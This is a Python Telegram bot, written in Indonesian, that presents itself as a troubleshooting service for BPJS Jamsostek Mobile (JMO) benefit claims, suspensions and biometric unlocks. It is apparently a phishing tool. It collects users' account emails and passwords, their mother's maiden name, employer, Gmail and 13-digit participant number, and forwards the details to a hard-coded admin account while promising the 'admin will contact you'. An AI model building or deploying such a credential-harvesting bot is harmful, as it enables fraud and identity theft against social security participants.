import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters
import re
from datetime import datetime

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

MAIN_MENU, CHOOSE_SERVICE, KODE_040_EMAIL, KODE_040_PASSWORD, KODE_040_TAHUN, SUSPEND_EMAIL, SUSPEND_PASSWORD, UNLOCK_IBU, UNLOCK_PERUSAHAAN, UNLOCK_GMAIL, UNLOCK_NOMOR = range(11)

ADMIN_ID = 1823591491  # GANTI DENGAN ID @play1990

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    welcome_text = f"""
╔═══════════════════════════════════════╗
║   🤖 BOT JAMSOSTEK TROUBLESHOOTING   ║
║      SELAMAT DATANG, {user.first_name}!       ║
╚═══════════════════════════════════════╝

📋 KLAIM JMO TROUBLESHOOTING

Pilih layanan yang Anda butuhkan:
"""
    keyboard = [
        ["🔹 Kode 040"],
        ["🔹 Suspend Nomor KPJ"],
        ["🔹 Unlock Biometrik"],
        ["ℹ️ Bantuan"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')
    return CHOOSE_SERVICE

async def choose_service(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text.strip()
    
    if "Kode 040" in text:
        context.user_data['service'] = 'Kode 040'
        await update.message.reply_text("✅ Langkah 1: Masukkan EMAIL Jamsostek Mobile:", reply_markup=ReplyKeyboardRemove())
        return KODE_040_EMAIL
    elif "Suspend Nomor KPJ" in text:
        context.user_data['service'] = 'Suspend Nomor KPJ'
        await update.message.reply_text("✅ Langkah 1: Masukkan EMAIL Jamsostek Mobile:", reply_markup=ReplyKeyboardRemove())
        return SUSPEND_EMAIL
    elif "Unlock Biometrik" in text:
        context.user_data['service'] = 'Unlock Biometrik'
        await update.message.reply_text("✅ Langkah 1: Masukkan NAMA IBU KANDUNG:", reply_markup=ReplyKeyboardRemove())
        return UNLOCK_IBU
    elif "Bantuan" in text:
        await show_help(update, context)
        return CHOOSE_SERVICE
    return CHOOSE_SERVICE

async def kode_040_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    email = update.message.text.strip()
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        await update.message.reply_text("❌ Email tidak valid!")
        return KODE_040_EMAIL
    context.user_data['email'] = email
    await update.message.reply_text("✅ Langkah 2: Masukkan PASSWORD:")
    return KODE_040_PASSWORD

async def kode_040_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['password'] = update.message.text
    await update.message.reply_text("✅ Langkah 3: Masukkan TAHUN KPJ (contoh: 2023):")
    return KODE_040_TAHUN

async def kode_040_tahun(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    tahun = update.message.text.strip()
    if not tahun.isdigit() or len(tahun) != 4:
        await update.message.reply_text("❌ Tahun harus 4 digit!")
        return KODE_040_TAHUN
    
    context.user_data['tahun'] = tahun
    await update.message.reply_text(f"⏳ Proses sedang berlangsung...\n⌛ Estimasi: 60 menit\n🕐 Dimulai: {datetime.now().strftime('%H:%M:%S')}")
    await send_to_admin(update, context)
    await update.message.reply_text("✅ DATA BERHASIL DIKIRIM!\n\n🎯 Admin akan menghubungi Anda.\n\nTekan /start untuk menu utama")
    return ConversationHandler.END

async def suspend_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    email = update.message.text.strip()
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        await update.message.reply_text("❌ Email tidak valid!")
        return SUSPEND_EMAIL
    context.user_data['email'] = email
    await update.message.reply_text("✅ Langkah 2: Masukkan PASSWORD:")
    return SUSPEND_PASSWORD

async def suspend_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['password'] = update.message.text
    await update.message.reply_text(f"⏳ Proses sedang berlangsung...\n⌛ Estimasi: 45 menit\n🕐 Dimulai: {datetime.now().strftime('%H:%M:%S')}")
    await send_to_admin(update, context)
    await update.message.reply_text("✅ DATA BERHASIL DIKIRIM!\n\n🎯 Admin akan menghubungi Anda.\n\nTekan /start untuk menu utama")
    return ConversationHandler.END

async def unlock_ibu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    nama = update.message.text.strip()
    if len(nama) < 3:
        await update.message.reply_text("❌ Nama terlalu pendek!")
        return UNLOCK_IBU
    context.user_data['nama_ibu'] = nama
    await update.message.reply_text("✅ Langkah 2: Masukkan NAMA PERUSAHAAN:")
    return UNLOCK_PERUSAHAAN

async def unlock_perusahaan(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    nama = update.message.text.strip()
    if len(nama) < 3:
        await update.message.reply_text("❌ Nama terlalu pendek!")
        return UNLOCK_PERUSAHAAN
    context.user_data['nama_perusahaan'] = nama
    await update.message.reply_text("✅ Langkah 3: Masukkan GMAIL AKTIF:")
    return UNLOCK_GMAIL

async def unlock_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    email = update.message.text.strip()
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        await update.message.reply_text("❌ Email tidak valid!")
        return UNLOCK_GMAIL
    context.user_data['email'] = email
    await update.message.reply_text("✅ Langkah 4: Masukkan NOMOR PESERTA (13 digit):")
    return UNLOCK_NOMOR

async def unlock_nomor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    nomor = update.message.text.strip()
    if not nomor.isdigit() or len(nomor) != 13:
        await update.message.reply_text("❌ Nomor harus 13 digit!")
        return UNLOCK_NOMOR
    context.user_data['nomor_peserta'] = nomor
    await send_to_admin(update, context)
    await update.message.reply_text("✅ DATA BERHASIL DIKIRIM!\n\n🎯 Admin akan menghubungi Anda.\n\nTekan /start untuk menu utama")
    return ConversationHandler.END

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
╔═══════════════════════════════════════╗
║        🆘 BANTUAN & INFORMASI        ║
╚═══════════════════════════════════════╝

<b>1️⃣ KODE 040</b> - Klaim benefit (60 menit)
<b>2️⃣ SUSPEND KPJ</b> - Lepas suspend (45 menit)
<b>3️⃣ UNLOCK BIOMETRIK</b> - Unlock biometrik

📞 Admin: @play1990
"""
    await update.message.reply_text(help_text, parse_mode='HTML')

async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = context.user_data
    service = data.get('service', 'N/A')
    
    msg = f"📨 DATA BARU\n👤 {user.first_name} (@{user.username})\n📋 Service: {service}\n"
    
    if service == 'Kode 040':
        msg += f"📧 Email: {data.get('email')}\n📅 Tahun: {data.get('tahun')}\n⏳ 60 menit"
    elif service == 'Suspend Nomor KPJ':
        msg += f"📧 Email: {data.get('email')}\n⏳ 45 menit"
    elif service == 'Unlock Biometrik':
        msg += f"👨‍👩‍👧 Ibu: {data.get('nama_ibu')}\n🏢 Perusahaan: {data.get('nama_perusahaan')}\n📧 Gmail: {data.get('email')}\n🆔 No: {data.get('nomor_peserta')}"
    
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
    except Exception as e:
        logger.error(f"Error: {e}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Dibatalkan.\n\nTekan /start untuk menu utama", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main() -> None:
    application = Application.builder().token("YOUR_BOT_TOKEN_HERE").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CHOOSE_SERVICE: [
                MessageHandler(filters.Regex('^🔹'), choose_service),
                MessageHandler(filters.Regex('^ℹ️'), choose_service),
            ],
            KODE_040_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_email)],
            KODE_040_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_password)],
            KODE_040_TAHUN: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_tahun)],
            SUSPEND_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, suspend_email)],
            SUSPEND_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, suspend_password)],
            UNLOCK_IBU: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_ibu)],
            UNLOCK_PERUSAHAAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_perusahaan)],
            UNLOCK_GMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_gmail)],
            UNLOCK_NOMOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_nomor)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('help', show_help))
    print("🤖 Bot is running... Press Ctrl+C to stop")
    application.run_polling()

if __name__ == '__main__':
    main()
